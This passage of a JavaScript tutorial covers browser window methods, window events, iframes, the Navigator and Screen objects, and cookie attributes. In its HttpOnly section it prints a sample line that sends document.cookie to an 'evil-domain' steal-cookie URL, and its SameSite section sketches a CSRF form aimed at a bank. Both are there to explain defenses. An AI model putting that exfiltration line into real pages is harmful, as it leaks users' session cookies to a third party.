The `window.stop()` method is completely equivalent to clicking the browser's stop button, and stops loading images, videos, and other objects that are loading or waiting to load.

```js
window.stop()
```



#### 3.3 window.moveTo() moves the window; window.moveBy() moves the window to a relative position

The `window.moveTo()` method is used to **move the browser window to a specified position**. It accepts two arguments, the horizontal distance and vertical distance of the top-left corner of the window from the top-left corner of the screen, in pixels.

```js
window.moveTo(100, 200)
```

The code above moves the window to position `(100, 200)` on the screen.

The `window.moveBy()` method **moves the window to a relative position**. It accepts two arguments, the horizontal distance the top-left corner of the window moves to the right and the vertical distance it moves down, in pixels.

```js
window.moveBy(25, 50)
```

The code above moves the window 25 pixels to the right and 50 pixels down.

To prevent someone from abusing these two methods to arbitrarily move the user's window, currently there is only one situation in which the browser allows a script to move a window: the window was created with the `window.open()` method, and the window has only that single tab page. In all other cases, using the two methods above has no effect.



#### 3.4 window.resizeTo() resizes the window to a size; window.resizeBy() resizes the window by a relative amount

The `window.resizeTo()` method is used to **resize the window to a specified size**.

It accepts two arguments: the first is the window width after resizing (the `outerWidth` property, including scrollbars, title bar, etc.), and the second is the window height after resizing (the `outerHeight` property).

```js
window.resizeTo(
  window.screen.availWidth / 2,
  window.screen.availHeight / 2
)
```

The code above resizes the current window to half the width and height of the screen's available area.

The `window.resizeBy()` method is used to resize the window. The difference from `window.resizeTo()` is that it resizes by a relative amount, whereas `window.resizeTo()` requires giving the absolute size after resizing.

It accepts two arguments: the first is the amount of horizontal resizing, and the second is the amount of vertical resizing, both in pixels.

```js
window.resizeBy(-200, -200)
```

The code above shrinks both the width and height of the current window by 200 pixels.

> Note: resizeTo resizes the window to a specified size, whereas resizeBy resizes it by a relative amount.



#### 3.5 window.scrollTo(), window.scroll(), window.scrollBy()

The `window.scrollTo` method is used to **scroll the document to a specified position**. It accepts two arguments, representing the page coordinates that will be at the top-left corner of the window after scrolling.

```js
window.scrollTo(x-coord, y-coord)
```

It can also accept a configuration object as an argument.

```js
window.scrollTo(options)
```

The configuration object `options` has three properties.

- `top`: the vertical coordinate of the top-left corner of the page after scrolling, that is, the y coordinate.
- `left`: the horizontal coordinate of the top-left corner of the page after scrolling, that is, the x coordinate.
- `behavior`: a string representing the scrolling method, with three possible values (`smooth`, `instant`, `auto`), defaulting to `auto`.

```js
window.scrollTo({
  top: 1000,
  behavior: 'smooth'
});
```

**The `window.scroll()` method is an alias of the `window.scrollTo()` method.**

The `window.scrollBy()` method is **used to scroll the page by a specified distance** (in pixels). It accepts two arguments: the pixels to scroll right horizontally, and the pixels to scroll down vertically.

```js
window.scrollBy(0, window.innerHeight)
```

The code above is used to scroll the page down by one screen.

If you do not want to scroll the entire document but instead want to **scroll a particular element, you can use the following three properties and methods**.

- Element.scrollTop
- Element.scrollLeft
- Element.scrollIntoView()





#### 3.6 window.print() the printer dialog

The `window.print` method **pops up the print dialog**, with the same effect as the user clicking the "Print" command in the menu.

The code for a common print button is as follows.

```js
document.getElementById('printLink').onclick = function () {
  window.print();
}
```

Non-desktop devices (such as mobile phones) may not have a print function, in which case you can check as follows.

```js
if (typeof window.print === 'function') {
  // printing is supported
}
```



#### 3.7 window.focus(), window.blur()

The `window.focus()` method activates the window, giving it focus and bringing it in front of other windows.

```js
var popup = window.open('popup.html', 'Popup Window');

if ((popup !== null) && !popup.closed) {
  popup.focus();
}
```

The code above first checks whether the `popup` window still exists, and after confirming, activates that window.

The `window.blur()` method removes focus from the window.

When the current window gains focus, the `focus` event is triggered; when the current window loses focus, the `blur` event is triggered.



#### 3.8 window.getSelection() gets the text selected by the user

The `window.getSelection` method returns a `Selection` object representing **the text the user currently has selected**.

```js
var selObj = window.getSelection();
```

Using the `toString` method of the `Selection` object, you can get the selected text.

```js
var selectedText = selObj.toString();
```



#### 3.9 window.getComputedStyle() returns the final styles of an element; window.matchMedia()

The `window.getComputedStyle()` method accepts an element node as an argument and returns an **object containing the final style information of that element**, see the chapter "CSS Operations" for details.

The `window.matchMedia()` method is **used to check a CSS `mediaQuery` statement**, see the chapter "CSS Operations" for details.



#### 3.10 window.requestAnimationFrame() defers a callback function to be executed at the next reflow

The `window.requestAnimationFrame()` method is **similar to `setTimeout`** in that **both defer the execution of a function**. The difference is that `setTimeout` must specify the time to defer, whereas `window.requestAnimationFrame()` **defers until the browser's next reflow**, and the next repaint occurs only after execution completes. A repaint usually occurs once every 16ms, but the browser automatically adjusts this rate; for example, when the page is switched to a background tab, `requestAnimationFrame()` pauses execution.

If a function changes the layout of the page, it is generally executed inside `window.requestAnimationFrame()`, which can save system resources and make the page effects smoother. This is because slow devices reflow and repaint at a slower rate, while faster devices have a faster rate.

This method **accepts a callback function as an argument**.

```js
window.requestAnimationFrame(callback)
```

In the code above, `callback` is a callback function. When `callback` executes, its argument is a high-precision timestamp passed in by the system (the return value of `performance.now()`), in milliseconds, representing the time since the page was loaded.

The return value of `window.requestAnimationFrame()` is an integer, and this integer can be passed to `window.cancelAnimationFrame()` to cancel the execution of the callback function.

Below is an example of using `window.requestAnimationFrame()` to run a page animation.

```js
var element = document.getElementById('animate');
element.style.position = 'absolute';

var start = null;

function step(timestamp) { // timestamp is the timestamp since the page finished loading
  if (!start) start = timestamp;
  var progress = timestamp - start;
  // the element keeps moving right, up to a maximum of 200 pixels
  element.style.left = Math.min(progress / 10, 200) + 'px';
  // if it has been no more than 2000 ms since the first execution,
  // continue running the animation
  if (progress < 2000) {
    window.requestAnimationFrame(step);
  }
}

window.requestAnimationFrame(step);
```

The code above defines a page animation that lasts 2 seconds and moves the element to the right.



#### 3.11 window.requestIdleCallback() defers a callback function to be executed when the system is idle

`window.requestIdleCallback()` is **similar to `setTimeout` in that it also defers the execution of a function, but it guarantees that the callback function is deferred until system resources are idle.** In other words, if a task is not very critical, you can use `window.requestIdleCallback()` to defer its execution in order to ensure page performance.

The difference from `window.requestAnimationFrame()` is that the latter specifies that the callback function executes at the next browser reflow; the problem is that at the next reflow, system resources may not be idle, and there is no guarantee it can be completed within 16 milliseconds. `window.requestIdleCallback()` can guarantee that the callback function executes when system resources are idle.

This method accepts a callback function and a configuration object as arguments. The configuration object can specify a maximum time to defer execution; if this time elapses, the callback function will execute regardless of whether system resources are idle.

```js
window.requestIdleCallback(callback[, options])
```

The `callback` argument is a callback function. When this callback function executes, the system passes in an `IdleDeadline` object as an argument. The `IdleDeadline` object has a `didTimeout` property (a boolean value indicating whether it is a timed-out call) and a `timeRemaining()` method (which returns the number of milliseconds remaining in that idle period).

The `options` argument is a configuration object that currently has only one property, `timeout`, used to specify the maximum number of milliseconds the callback function's execution can be deferred. This argument is optional.

The `window.requestIdleCallback()` method returns an integer. This integer can be passed to `window.cancelIdleCallback()` to cancel the callback function.

Below is an example.

```js
requestIdleCallback(myNonEssentialWork);

function myNonEssentialWork(deadline) {
  while (deadline.timeRemaining() > 0) {
    doWorkIfNeeded();
  }
}
```

In the code above, `requestIdleCallback()` is used to execute the non-critical task `myNonEssentialWork`. This task first confirms that there is remaining time in this idle period, and only then actually starts executing the task.

Below is an example specifying `timeout`.

```js
requestIdleCallback(processPendingAnalyticsEvents, { timeout: 2000 });
```

The code above specifies that `processPendingAnalyticsEvents` must be executed within the next 2 seconds.

If the callback function executes due to a timeout, then `deadline.timeRemaining()` returns `0` and `deadline.didTimeout` returns `true`.

If `window.requestIdleCallback()` is executed multiple times, specifying multiple callback functions, then these callback functions are arranged in a queue and executed in first-in-first-out order.



### 4. Events

The `window` object can receive the following events.

#### 4.1 The load event and the onload property

The `load` event occurs when the document has finished loading in the browser window. The `window.onload` property can specify the callback function for this event.

```js
window.onload = function() {
  var elements = document.getElementsByClassName('example');
  for (var i = 0; i < elements.length; i++) {
    var elt = elements[i];
    // ...
  }
};
```

The code above, after the page has finished loading, obtains the specified elements and processes them.



#### 4.2 The error event and the onerror property

When an error occurs in a browser script, the `error` event of the `window` object is triggered. We can specify a callback function for this event via the `window.onerror` property.

```js
window.onerror = function (message, filename, lineno, colno, error) {
  console.log("An error occurred! --> %s", error.stack);
};
```

For historical reasons, the callback function of the `window` `error` event does not accept the error object as an argument, but instead can accept a total of five arguments, whose meanings are as follows.

- the error message
- the URL of the script where the error occurred
- the line number
- the column number
- the error object

Older browsers only support the first three arguments.

Not all errors trigger JavaScript's `error` event (that is, cause JavaScript to report an error). Generally speaking, only errors in JavaScript scripts trigger this event, while errors such as a missing resource file do not.

Below is an example: if the entire page has more than 3 uncaught errors, a warning is displayed.

```js
window.onerror = function(msg, url, line) {
  if (onerror.num++ > onerror.max) {
    alert('ERROR: ' + msg + '\n' + url + ':' + line);
    return true;
  }
}
onerror.max = 3;
onerror.num = 0;
```

Note that if the script URL and the page URL are not in the same domain (for example, when a CDN is used), the browser will not provide detailed error information at all, only indicating that an error occurred, with the error type being "Script error.", the line number being 0, and no other information. This is the browser preventing information from leaking to external scripts. One solution is to set the `Access-Control-Allow-Origin` HTTP header on the server where the script resides.

```js
Access-Control-Allow-Origin: *
```

Then, set the `crossorigin` attribute on the page's `<script>` tag.

```html
<script crossorigin="anonymous" src="//example.com/file.js"></script>
```

In the code above, `crossorigin="anonymous"` means that reading the file does not require identity information, that is, neither cookies nor HTTP authentication information are needed. If set to `crossorigin="use-credentials"`, it means the browser will upload cookies and HTTP authentication information, and the server side also needs to enable the HTTP header `Access-Control-Allow-Credentials`.



#### 4.3 The window object's event listener properties

In addition to having the GlobalEventHandlers interface that all element nodes have, the `window` object also has the following event listener function properties.

- `window.onafterprint`: the listener function for the `afterprint` event.
- `window.onbeforeprint`: the listener function for the `beforeprint` event.
- `window.onbeforeunload`: the listener function for the `beforeunload` event.
- `window.onhashchange`: the listener function for the `hashchange` event.
- `window.onlanguagechange`: the listener function for `languagechange`.
- `window.onmessage`: the listener function for the `message` event.
- `window.onmessageerror`: the listener function for the `MessageError` event.
- `window.onoffline`: the listener function for the `offline` event.
- `window.ononline`: the listener function for the `online` event.
- `window.onpagehide`: the listener function for the `pagehide` event.
- `window.onpageshow`: the listener function for the `pageshow` event.
- `window.onpopstate`: the listener function for the `popstate` event.
- `window.onstorage`: the listener function for the `storage` event.
- `window.onunhandledrejection`: the listener function for the `reject` event of an unhandled Promise object.
- `window.onunload`: the listener function for the `unload` event.



### 5. Multi-window operations

Since a page can use the `iframe` element to embed other pages, multiple windows can form within a single page. If another page is embedded within a child window, a multi-level window structure is formed.

#### 5.1 Referencing windows

Scripts in each window can reference other windows. The browser provides some special variables that return other windows.

- `top`: the top-level window, that is, the topmost window
- `parent`: the parent window
- `self`: the current window, that is, itself

The code below can determine whether the current window is the top-level window.

```js
if (window.top === window.self) {
  // the current window is the top-level window
} else {
  // the current window is a child window
}
```

The code below makes the parent window's browsing history go back once.

```js
window.parent.history.back();
```

Corresponding to these variables, the browser also provides some special window names for use by the `window.open()` method, the `  <a>  ` tag, the ` <form> ` tag, and so on.

- `_top`: the top-level window
- `_parent`: the parent window
- `_blank`: a new window

The code below means opening the link in the top-level window.

```html
<a href="somepage.html" target="_top">Link</a>
```



#### 5.2 The iframe element

For a window embedded by `iframe`, the `document.getElementById` method can obtain the DOM node of that window, and then the `contentWindow` property is used to obtain the `window` object contained in the `iframe` node.

```js
var frame = document.getElementById('theFrame');
var frameWindow = frame.contentWindow;
```

In the code above, `frame.contentWindow` can obtain the child window's `window` object. Then, when the same-origin restriction is satisfied, you can read the internal properties of the child window.

```js
// get the title of the child window
frameWindow.title
```

The `contentDocument` property of the `  <iframe>  ` element can obtain the child window's `document` object.

```js
var frame = document.getElementById('theFrame');
var frameDoc = frame.contentDocument;

// equivalent to
var frameDoc = frame.contentWindow.document;
```

The `  <iframe>  ` element obeys the same-origin policy. Only when the parent window and the child window are in the same domain can they communicate via scripts; otherwise the only option is the `window.postMessage` method.

Inside an `  <iframe>  ` window, use `window.parent` to reference the parent window. If the current page has no parent window, then the `window.parent` property returns itself. Therefore, you can determine whether the current window is an iframe window by checking whether `window.parent` equals `window.self`.

```js
if (window.parent !== window.self) {
  // the current window is a child window
}
```

The `window` object of an `  <iframe>  ` window has a `frameElement` property, which returns the DOM node of the `<iframe>` in the parent window. For a non-embedded window, this property equals `null`.

```js
var f1Element = document.getElementById('f1');
var f1Window = f1Element.contentWindow;

f1Window.frameElement === f1Element // true
window.frameElement === null // true
```



#### 5.3 The window.frames property

The `window.frames` property returns an array-like object whose members are the `window` objects of all child windows. You can use this property to achieve mutual referencing between windows. For example, `frames[0]` returns the first child window, `frames[1].frames[2]` returns the third child window inside the second child window, and `parent.frames[1]` returns the second child window of the parent window.

Note that the value of each member of `window.frames` is the window inside the frame (that is, the frame's `window` object), not the DOM node of the `iframe` tag in the parent window. To obtain the DOM tree inside each frame, you need to use the `window.frames[0].document` form.

In addition, if an `  <iframe>  ` element has a `name` or `id` attribute set, then the attribute value automatically becomes a global variable, and can be referenced through the `window.frames` property, returning the child window's `window` object.

```js
// HTML code is <iframe id="myFrame">
window.myFrame // [HTMLIFrameElement]
frames.myframe === myFrame // true
```

In addition, the value of the `name` attribute automatically becomes the name of the child window, which can be used in the second argument of the `window.open` method, or in the `target` attribute of the `  <a>  ` and ` <frame> ` tags.

## 3. Navigator Object and Screen Object

 The `window.navigator` property points to a **Navigator object containing browser and system information**. Scripts use this property to learn about the user's environment.

### 1. Properties of the Navigator object

#### 1.1 Navigator.userAgent: browser vendor and version

The `navigator.userAgent` property returns the browser's User Agent string, representing **the browser's vendor and version information**.

Below is the `userAgent` of the Chrome browser.

```js
navigator.userAgent
// "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"
```

Identifying the browser via the `userAgent` property is not a good approach. Because you must consider all cases (different browsers, different versions), it is very cumbersome, and the user can change this string. The format of this string is not uniformly defined, nor can future applicability be guaranteed; all kinds of internet devices keep emerging and are hard to enumerate exhaustively. Therefore, browsers are generally no longer identified through it; instead the "feature detection" method is used, that is, testing one by one whether the current browser supports the JavaScript features to be used.

However, the `userAgent` can roughly accurately identify mobile browsers; the method is to test whether it contains the `mobi` string.

```js
var ua = navigator.userAgent.toLowerCase();

if (/mobi/i.test(ua)) {
  // mobile browser
} else {
  // non-mobile browser
}
```

If you want to identify all mobile device browsers, you can test more characteristic strings.

```js
/mobi|android|touch|mini/i.test(ua)
```



#### 1.2 Navigator.plugins: browser plugins

The `Navigator.plugins` property returns an **array-like object** whose members are Plugin instance objects, representing **the plugins installed in the browser**, such as Flash, ActiveX, etc.

```js
var pluginsLength = navigator.plugins.length;

for (var i = 0; i < pluginsLength; i++) {
  console.log(navigator.plugins[i].name);
  console.log(navigator.plugins[i].filename);
  console.log(navigator.plugins[i].description);
  console.log(navigator.plugins[i].version);
}
```



#### 1.3 Navigator.platform: operating system information

The `Navigator.platform` property **returns the user's operating system information**, such as `MacIntel`, `Win32`, `Linux x86_64`, etc.

```js
navigator.platform
// "Linux x86_64"
```



#### 1.4 Navigator.onLine: whether online

The `navigator.onLine` property returns a **boolean value** indicating **whether the user is currently online or offline (the browser is disconnected)**.

```js
navigator.onLine // true
```

Sometimes the browser can connect to the local area network, but the local area network cannot reach the external network. In this case, some browsers' `onLine` property returns `true`, so you cannot assume that as long as it is `true`, the user can definitely access the internet. However, if it is `false`, you can conclude that the user is definitely offline.

**When the user becomes online, the `online` event is triggered, and when they become offline, the `offline` event is triggered; you can specify the callback functions for these two events via `window.ononline` and `window.onoffline`.**

```js
window.addEventListener('offline', function(e) { console.log('offline'); });
window.addEventListener('online', function(e) { console.log('online'); });
```



#### 1.5 Navigator.language: the preferred language; Navigator.languages: an array of acceptable languages

The `Navigator.language` property returns a **string** representing **the browser's preferred language**. This property is **read-only**.

```js
navigator.language // "en"
```

The `Navigator.languages` property returns an **array** representing **the languages the user can accept**. `Navigator.language` is always the first member of this array. The `Accept-Language` field of the HTTP request header comes from this array.

```js
navigator.languages  // ["en-US", "en", "zh-CN", "zh", "zh-TW"]
```

If this property changes, the `languagechange` event is triggered on the `window` object.



#### 1.6 Navigator.geolocation: geographic location

The `Navigator.geolocation` property returns a Geolocation object containing **information about the user's geographic location**. Note that this API is only available under the HTTPS protocol; otherwise an error is thrown when calling the methods below.

The Geolocation object provides the following three methods.

- Geolocation.getCurrentPosition(): gets the user's current position
- Geolocation.watchPosition(): listens for changes in the user's position
- Geolocation.clearWatch(): cancels the listener function specified by the `watchPosition()` method

Note that when calling these three methods, the browser pops up a dialog box asking the user to grant authorization.



#### 1.7 Navigator.cookieEnabled: whether the browser's cookies are enabled

The `Navigator.cookieEnabled` property returns a boolean value indicating **whether the browser's cookie feature is enabled**.

```js
navigator.cookieEnabled // true
```

**Note that this property reflects the browser's overall characteristics, and has nothing to do with whether cookies for a specific site are stored**. A user can configure a particular site not to store cookies, in which case `cookieEnabled` still returns `true`.



### 2. Methods of the Navigator object

#### 2.1 Navigator.javaEnabled(): whether Java applets can be run

The `Navigator.javaEnabled()` method returns a boolean value indicating **whether the browser can run Java applets**.

```js
navigator.javaEnabled() // false
```



#### 2.1 Navigator.sendBeacon(): used to asynchronously send data to the server

The `Navigator.sendBeacon()` method is **used to asynchronously send data to the server**, see the chapter "The XMLHttpRequest Object" for details.



### 3. The Screen object (screen information object)

The Screen object represents **the screen on which the current window resides**, and provides information about the display device. The `window.screen` property points to this object.

This object has the following properties.

- `Screen.height`: the **height of the screen** on which the browser window resides (in pixels). Unless the monitor's resolution is adjusted, this value can be regarded as a constant and does not change. The monitor's resolution is unrelated to browser settings, and zooming the page does not change the resolution.
- `Screen.width`: the **width of the screen** on which the browser window resides (in pixels).
- `Screen.availHeight`: the **screen height available to the browser window** (in pixels). Because part of the space may be unavailable, such as the system's taskbar or the Dock area at the bottom of the Mac screen, this property equals `height` minus the height of those system components.
- `Screen.availWidth`: the **screen width available to the browser window** (in pixels).
- `Screen.pixelDepth`: an integer representing the **color bit depth of the screen**; for example, `24` means the screen provides 24-bit color.
- `Screen.colorDepth`: an alias of `Screen.pixelDepth`. Strictly speaking, colorDepth represents the **color depth of the application**, and pixelDepth represents the **color depth of the screen**; in the vast majority of cases, they are the same thing.
- `Screen.orientation`: returns an object representing **the orientation of the screen**. The `type` property of this object is a string representing the specific orientation of the screen: `landscape-primary` means landscape, `landscape-secondary` means upside-down landscape, `portrait-primary` means portrait, and `portrait-secondary`.

Below is an example of `Screen.orientation`.

```js
window.screen.orientation
// { angle: 0, type: "landscape-primary", onchange: null }
```

The example below ensures the screen resolution is greater than 1024 x 768.

```js
if (window.screen.width >= 1024 && window.screen.height >= 768) {
  // resolution is at least 1024x768
}
```

Below is **code that directs the user to different pages based on the screen width.**

```js
if ((screen.width <= 800) && (screen.height <= 600)) {
  window.location.replace('small.html');
} else {
  window.location.replace('wide.html');
}
```

## 4. Cookies

### 1. Overview

A cookie is **a small piece of text information that the server saves in the browser, generally not exceeding 4KB in size**. **Every time the browser makes a request to the server, it automatically attaches this information**.

Cookies mainly store state information; below are some of their main uses.

- Session management: storing login, shopping cart, and other information that needs to be recorded.
- Personalization information: storing user preferences, such as the page's font size, background color, etc.
- User tracking: recording and analyzing user behavior.

Cookies are not an ideal client-side storage mechanism. Their capacity is very small (4KB), they lack a data manipulation interface, and they affect performance. Client-side storage should use the Web Storage API and IndexedDB. **Only information that the server needs to know on every request should be placed in cookies.**

Each cookie has the following metadata.

- The cookie's name
- The cookie's value (the actual data is written here)
- The expiration time (after which it becomes invalid)
- The domain it belongs to (defaults to the current domain)
- The effective path (defaults to the current URL)

For example, when the user visits the URL `www.example.com`, the server writes a cookie in the browser. This cookie's domain is `www.example.com`, and its effective path is the root path `/`. If the cookie's effective path is set to `/forums`, then this cookie is only valid when visiting `www.example.com/forums` and its sub-paths. Thereafter, before the browser visits a path, it finds the cookies that are valid for that domain and path and have not yet expired, and sends them all to the server.

The user can configure the browser not to accept cookies, and can also configure it not to send cookies to the server. The `window.navigator.cookieEnabled` property returns a boolean value indicating whether the browser's cookie feature is enabled.

```js
window.navigator.cookieEnabled // true
```

The `document.cookie` property returns the cookies of the current page.

```js
document.cookie // "id=foo;key=bar"
```

Different browsers have different limits on the number and size of cookies. Generally speaking, a single domain should not set more than 30 cookies, and each cookie's size cannot exceed 4KB. Once the limit is exceeded, the cookie is ignored and not set.

The browser's same-origin policy stipulates that two URLs can share cookies as long as the domain and port are the same (see the chapter "Same-Origin Policy"). Note that the protocol is not required to be the same. In other words, cookies set by `http://example.com` can be read by `https://example.com`.



### 2. Cookies and the HTTP protocol

Cookies **are generated by the HTTP protocol and are also mainly used by the HTTP protocol.**

#### 2.1 HTTP response: generating a cookie

If the server wants to save a cookie in the browser, it places a `Set-Cookie` field in the headers of the HTTP response.

```js
Set-Cookie:foo=bar
```

The code above saves a cookie named `foo` in the browser, with the value `bar`.

An HTTP response can contain multiple `Set-Cookie` fields, that is, generate multiple cookies in the browser. Below is an example.

```js
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
```

In addition to the cookie's value, the `Set-Cookie` field can also append cookie attributes.

```js
Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>
Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>
Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>
Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>
Set-Cookie: <cookie-name>=<cookie-value>; Secure
Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly
```

The meanings of these attributes will be explained later.

A single `Set-Cookie` field can include multiple attributes at the same time, with no ordering requirement.

```js
Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly
```

Below is an example.

```js
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

If the server wants to change a previously set cookie, four conditions must be satisfied simultaneously: the cookie's `key`, `domain`, `path`, and `secure` must all match. For example, if the original cookie was set with the following `Set-Cookie`.

```js
Set-Cookie: key1=value1; domain=example.com; path=/blog
```

To change the value of this cookie, you must use the same `Set-Cookie`.

```js
Set-Cookie: key1=value2; domain=example.com; path=/blog
```

As long as one attribute differs, a brand-new cookie is generated rather than replacing the original cookie.

```js
Set-Cookie: key1=value2; domain=example.com; path=/
```

The command above sets a brand-new cookie with the same name, but with a different `path` attribute. The next time `example.com/blog` is visited, the browser will send two cookies with the same name to the server.

```js
Cookie: key1=value1; key1=value2
```

The two cookies in the code above have the same name; the more precisely matching cookie is placed first.



#### 2.2 HTTP request: sending cookies

When the browser sends an HTTP request to the server, every request carries the corresponding cookies. In other words, the information the server previously saved in the browser is sent back to the server. This uses the `Cookie` field of the HTTP headers.

```js
Cookie: foo=bar
```

The code above sends a cookie named `foo` to the server, with the value `bar`.

The `Cookie` field can contain multiple cookies, separated by semicolons (`;`).

```js
Cookie: name=value; name2=value2; name3=value3
```

Below is an example.

```js
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

When the server receives the cookies sent by the browser, there are two things it cannot know.

- The various attributes of the cookie, such as when it expires.
- Which domain set the cookie, whether it was set by the first-level domain or by some second-level domain.



### 3. Cookie attributes

#### 3.1 Expires: validity period; Max-Age: maximum lifetime in seconds

The `Expires` attribute specifies a concrete **expiration time**; after the specified time arrives, the browser no longer retains this cookie. Its value is in UTC format, and you can use `Date.prototype.toUTCString()` for format conversion.

```js
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
// sets the cookie, with key id equal to value a3fWa, and sets the expiration time
```

If this attribute is not set, or is set to `null`, the cookie is only valid for the current session; once the browser window is closed and the current session ends, the cookie is deleted. In addition, the browser decides whether a cookie has expired based on local time, and since local time is imprecise, there is no way to guarantee that the cookie will definitely expire at the time specified by the server.

The `Max-Age` attribute specifies **the number of seconds the cookie exists starting from now**, such as `60 * 60 * 24 * 365` (that is, one year). After this time has elapsed, the browser no longer retains this cookie.

If both `Expires` and `Max-Age` are specified, then the value of `Max-Age` takes precedence.

If the `Set-Cookie` field does not specify the `Expires` or `Max-Age` attribute, then this cookie is a session cookie, that is, it only exists for the current session; once the user closes the browser, the browser no longer retains this cookie.



#### 3.2 Domain; Path

The `Domain` attribute **specifies which domains should carry this cookie when the browser makes HTTP requests**. If this attribute is not specified, the browser defaults it to the current domain, in which case subdomains will not carry this cookie. For example, if `example.com` does not set the cookie's `domain` attribute, then `sub.example.com` will not carry this cookie. **If the `domain` attribute is specified, then subdomains will also carry this cookie**. If the domain specified by the server does not belong to the current domain, the browser rejects this cookie.

The `Path` attribute specifies which paths should carry this cookie when the browser makes HTTP requests. As long as the browser finds that the `Path` attribute is a prefix of the HTTP request path, it carries this cookie in the headers. For example, if the `PATH` attribute is `/`, then requesting the `/docs` path will also include this cookie. Of course, the precondition is that the domain must match.



#### 3.3 Secure: effective only under the encrypted HTTPS protocol; HttpOnly: only HTTP requests can obtain it

The `Secure` attribute specifies that **the browser can send this cookie to the server only under the encrypted HTTPS protocol**. On the other hand, if the current protocol is HTTP, the browser automatically ignores the `Secure` attribute sent by the server. This attribute is just a switch and **does not need a value to be specified**. If the communication uses the HTTPS protocol, the switch is automatically turned on.

The `HttpOnly` attribute **specifies that this cookie cannot be obtained via JavaScript scripts; specifically, the `document.cookie` property, the `XMLHttpRequest` object, and the Request API all cannot obtain this attribute**. This prevents the cookie from being read by scripts; the cookie is only carried when the browser makes an HTTP request.

```js
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

The above is the code of a malicious script loaded cross-site, which can send the current page's cookies to a third-party server. If a cookie's `HttpOnly` attribute is set, the code above will not be able to read that cookie.



#### 3.4 SameSite: preventing CSRF attacks and user tracking

Starting with Chrome 51, the browser's cookies added a new `SameSite` attribute, used to **prevent CSRF attacks and user tracking**.

Cookies are often used to store the user's identity information, and a malicious site can attempt to forge an HTTP request with the correct cookie; this is a CSRF attack. For example, suppose the user logs into the bank site `your-bank.com`, and the bank server sends a cookie.

```
Set-Cookie:id=a3fWa;
```

The user later visits the malicious site `malicious.com`, which has a form on it.

```html
<form action="your-bank.com/transfer" method="POST">
  ...
</form>
```

Once the user is tricked into submitting this form, the bank site receives a request with the correct cookie. To prevent this kind of attack, the form usually carries a random token telling the server that this is a genuine request.

```html
<form action="your-bank.com/transfer" method="POST">
  <input type="hidden" name="token" value="dad3weg34">
  ...
</form>
```

Cookies that are sent as a result of a third-party site's guidance are called third-party cookies. Besides being used for CSRF attacks, they can also be used for user tracking. For example, Facebook inserts an invisible image on a third-party site.

```html
<img src="facebook.com" style="visibility:hidden;">
```

When the browser loads the code above, it sends a request with the cookie to Facebook, and thus Facebook knows who you are and which site you visited.

The cookie's `SameSite` attribute is used to restrict third-party cookies, thereby reducing security risks. It can be set to three values.

> - Strict
> - Lax
> - None

**(1) Strict**

`Strict` is the most strict, completely forbidding third-party cookies; for cross-site requests, cookies are never sent under any circumstances. In other words, cookies are only carried when the current page's URL matches the request target.

```
Set-Cookie: CookieName=CookieValue; SameSite=Strict;
```

This rule is overly strict and may cause a very poor user experience. For example, if the current page has a GitHub link, when the user clicks to navigate, the GitHub cookie will not be carried, so the destination is always in a logged-out state.

**(2) Lax**

The `Lax` rule is slightly relaxed; in most cases it also does not send third-party cookies, except for GET requests that navigate to the target URL.

```
Set-Cookie: CookieName=CookieValue; SameSite=Lax;
```

GET requests that navigate to the target URL include only three cases: links, preload requests, and GET forms. See the table below for details.

| Request type |    Example     |   Normal case | Lax         |
| :----------- | :------------: | ------------: | :---------- |
| Link         |       ``       | Sends cookie  | Sends cookie |
| Preload      |       ``       | Sends cookie  | Sends cookie |
| GET form     |       ``       | Sends cookie  | Sends cookie |
| POST form    |       ``       | Sends cookie  | Not sent    |
| iframe       |       ``       | Sends cookie  | Not sent    |
| AJAX         | `$.get("...")` | Sends cookie  | Not sent    |
| Image        |       ``       | Sends cookie  | Not sent    |

After setting `Strict` or `Lax`, CSRF attacks are basically eliminated. Of course, the precondition is that the user's browser supports the SameSite attribute.

**(3) None**

Chrome plans to make `Lax` the default setting. At that point, a site can choose to explicitly turn off the `SameSite` attribute by setting it to `None`. However, the precondition is that the `Secure` attribute must also be set (cookies can only be sent over the HTTPS protocol), otherwise it has no effect.

The following setting is invalid.

```
Set-Cookie: widget_session=abc123; SameSite=None
```

The following setting is valid.

```
Set-Cookie: widget_session=abc123; SameSite=None; Secure
```



### 4. document.cookie: used to read and write the current page's cookies

The `document.cookie` property is **used to read and write the current page's cookies**.

When reading, it returns all cookies of the current page, provided that the cookies do not have the `HTTPOnly` attribute.

```js
document.cookie // "foo=bar;baz=bar"
```

The code above reads out two cookies from `document.cookie` at once, separated by a semicolon. You must manually parse it to extract the value of each cookie.

```js
var cookies = document.cookie.split(';');

for (var i = 0; i < cookies.length; i++) {
  console.log(cookies[i]);
}
// foo=bar
// baz=bar
```

The `document.cookie` property is **writable**, and you can add cookies for the current site through it.

```js
document.cookie = 'fontSize=14';
```

When writing, the cookie's value must be written in the form `key=value`. Note that there can be no spaces on either side of the equals sign. In addition, when writing a cookie, you must escape semicolons, commas, and spaces (none of which are allowed as a cookie value), which can be achieved with the `encodeURIComponent` method.

However, `document.cookie` **can only write one cookie at a time**, and writing does not overwrite but adds.

```js
document.cookie = 'test1=hello';
document.cookie = 'test2=world';
document.cookie
// test1=hello;test2=world
```

The difference in the read/write behavior of `document.cookie` (you can read out all cookies at once, but can only write one cookie at a time) is related to the cookie communication format of the HTTP protocol. When the browser sends cookies to the server, the `Cookie` field sends all cookies in a single line; when the server sets cookies in the browser, each `Set-Cookie` field sets one cookie per line.

When writing a cookie, you can write the cookie's attributes along with it.

```js
document.cookie = "foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT";
```

